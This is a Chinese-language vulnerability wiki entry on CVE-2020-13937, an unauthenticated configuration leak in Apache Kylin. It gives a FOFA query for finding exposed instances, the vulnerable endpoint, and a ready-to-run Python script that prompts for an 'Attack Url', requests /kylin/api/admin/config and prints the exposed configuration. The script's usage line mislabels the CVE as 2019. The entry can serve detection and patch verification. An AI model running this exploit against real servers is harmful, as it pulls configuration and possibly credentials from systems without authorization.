# Apache Kylin的未授权配置泄露 CVE-2020-13937

## 漏洞描述

Apache Kylin有一个restful api会在没有任何认证的情况下暴露配置信息。

### FOFA

> [!NOTE]
>
> app="APACHE-kylin"

## 漏洞影响

> [!NOTE]
>
> Apahche Kylin 2.x.x
>
> Apahche Kylin <= 3.1.0
>
> Apahche Kylin 4.0.0-alpha

## 漏洞复现

根据漏洞情报

![](http://wikioss.peiqi.tech/vuln/apache kylin-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

漏洞利用POC为  http://xxx.xxx.xxx.xxx/kylin/api/admin/config

![](http://wikioss.peiqi.tech/vuln/apache kylin-2.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

## 漏洞检测POC

```python
import requests

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                     \033[0m')
    print('+  \033[34mVersion: Apache Kylin 2.x.x <= 3.1.0 Kylin 4.0.0-alpha            \033[0m')
    print('+  \033[36m使用格式: python3 cve-2019-13937.py                                 \033[0m')
    print('+  \033[36mUrl    >>> http://xxx.xxx.xxx.xxx:9999                            \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/kylin/api/admin/config"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    try:
        response = requests.get(url=vuln_url, headers=headers, timeout=20)
        if "config" in response.text:
            print("\033[32m[o] 存在Apache Kylin的未授权配置泄露\n[o] 响应为:\n\033[0m",response.text)
        else:
            print("\033[31m[x] 目标Url漏洞利用失败\033[0m")
    except:
        print("\033[31m[x] 目标Url漏洞利用失败\033[0m")

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url)
```

![](http://wikioss.peiqi.tech/vuln/apache kylin-3.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

##  Goby && POC

> [!NOTE]
>
> 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中
>
> Apache_Kylin_Unauthorized_configuration_disclosure.json

![](http://wikioss.peiqi.tech/vuln/kylin-25.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

### 参考

[CVE-2020-13937|Apache Kylin的未授权配置泄露漏洞，腾讯安全全面支持检测](https://s.tencent.com/research/bsafe/1156.html)